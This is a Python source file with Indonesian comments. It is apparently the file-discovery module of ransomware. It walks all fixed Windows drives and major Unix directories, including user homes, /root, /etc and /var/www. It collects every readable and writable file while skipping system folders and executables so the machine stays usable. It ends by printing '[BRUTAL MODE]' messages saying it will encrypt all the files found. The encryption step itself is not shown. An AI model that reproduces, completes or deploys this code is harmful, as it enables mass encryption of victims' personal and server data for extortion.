import os
import platform
import win32api
import win32con
import ctypes

class discover:
    @staticmethod
    def get_all_drives_windows():
        """Mendapatkan semua drive yang tersedia di Windows"""
        drives = []
        try:
            for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
                if win32api.GetDriveType(drive) == win32con.DRIVE_FIXED:
                    drives.append(drive)
        except:
            # Fallback method jika win32api gagal
            for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
                drive = letter + ':\\'
                if os.path.exists(drive):
                    drives.append(drive)
        return drives

    @staticmethod
    def get_all_dirs_unix():
        """Mendapatkan semua direktori utama di Linux/Unix"""
        dirs = []
        # Root directory dan home directories
        dirs.append('/')
        dirs.append('/home')
        dirs.append('/root')
        dirs.append('/etc')
        dirs.append('/var')
        dirs.append('/usr')
        dirs.append('/opt')
        
        # Cari semua home directories
        if os.path.exists('/home'):
            try:
                for user in os.listdir('/home'):
                    user_home = os.path.join('/home', user)
                    if os.path.isdir(user_home):
                        dirs.append(user_home)
            except:
                pass
                
        # Mounted drives
        if os.path.exists('/media'):
            dirs.append('/media')
        if os.path.exists('/mnt'):
            dirs.append('/mnt')
            
        return dirs

    @staticmethod
    def discoverFiles(startpath):
        """Mencari SEMUA file di SEMUA direktori tanpa terkecuali"""
        all_files = []
        
        # Skip extensions yang berbahaya untuk dienkripsi
        skip_extensions = ['.exe', '.dll', '.sys', '.ini', '.log', '.tmp']
        skip_dirs = ['System32', 'Windows', 'Program Files', 'Program Files (x86)', 
                    '$Recycle.Bin', 'System Volume Information', 'boot', 'proc', 'sys', 'dev']
        
        plt = platform.system()
        
        # Jika startpath adalah "None" atau tidak spesifik, cari SEMUA drive/directory
        if startpath == "None" or startpath == "":
            if plt == "Windows":
                drives = discover.get_all_drives_windows()
                for drive in drives:
                    try:
                        for root, dirs, files in os.walk(drive, topdown=True):
                            # Skip system directories
                            dirs[:] = [d for d in dirs if d not in skip_dirs]
                            
                            for file in files:
                                file_ext = os.path.splitext(file)[1].lower()
                                if file_ext not in skip_extensions:
                                    file_path = os.path.join(root, file)
                                    try:
                                        # Cek apakah file bisa diakses
                                        if os.path.isfile(file_path) and os.access(file_path, os.R_OK | os.W_OK):
                                            all_files.append(file_path)
                                    except:
                                        continue
                    except Exception as e:
                        print(f"Error accessing {drive}: {e}")
                        continue
                        
            elif plt == "Linux" or plt == "Darwin":
                dirs_to_scan = discover.get_all_dirs_unix()
                for directory in dirs_to_scan:
                    try:
                        for root, dirs, files in os.walk(directory, topdown=True):
                            # Skip system directories
                            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in skip_dirs]
                            
                            for file in files:
                                file_ext = os.path.splitext(file)[1].lower()
                                if file_ext not in skip_extensions:
                                    file_path = os.path.join(root, file)
                                    try:
                                        if os.path.isfile(file_path) and os.access(file_path, os.R_OK | os.W_OK):
                                            all_files.append(file_path)
                                    except:
                                        continue
                    except Exception as e:
                        print(f"Error accessing {directory}: {e}")
                        continue
        else:
            # Jika path spesifik diberikan, scan dari path tersebut
            try:
                for root, dirs, files in os.walk(startpath, topdown=True):
                    # Skip system directories
                    dirs[:] = [d for d in dirs if d not in skip_dirs]
                    
                    for file in files:
                        file_ext = os.path.splitext(file)[1].lower()
                        if file_ext not in skip_extensions:
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.isfile(file_path) and os.access(file_path, os.R_OK | os.W_OK):
                                    all_files.append(file_path)
                            except:
                                continue
            except Exception as e:
                print(f"Error accessing {startpath}: {e}")
        
        # Tambahkan juga user directories yang umum
        if plt == "Windows":
            user_dirs = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('HOMEDRIVE', '') + os.environ.get('HOMEPATH', ''),
                os.path.expanduser('~'),
                'C:\\Users',
                'D:\\',
                'E:\\'
            ]
        else:
            user_dirs = [
                os.path.expanduser('~'),
                '/home',
                '/root',
                '/var/www',
                '/etc'
            ]
        
        for ud in user_dirs:
            if ud and os.path.exists(ud) and ud not in all_files:
                try:
                    for root, dirs, files in os.walk(ud, topdown=True):
                        dirs[:] = [d for d in dirs if d not in skip_dirs]
                        for file in files:
                            file_ext = os.path.splitext(file)[1].lower()
                            if file_ext not in skip_extensions:
                                file_path = os.path.join(root, file)
                                if file_path not in all_files:
                                    try:
                                        if os.path.isfile(file_path) and os.access(file_path, os.R_OK | os.W_OK):
                                            all_files.append(file_path)
                                    except:
                                        continue
                except:
                    continue
        
        print(f"[BRUTAL MODE] Total files ditemukan: {len(all_files)}")
        print(f"[BRUTAL MODE] Akan mengenkripsi SEMUA file yang ditemukan!")
        
        return all_files
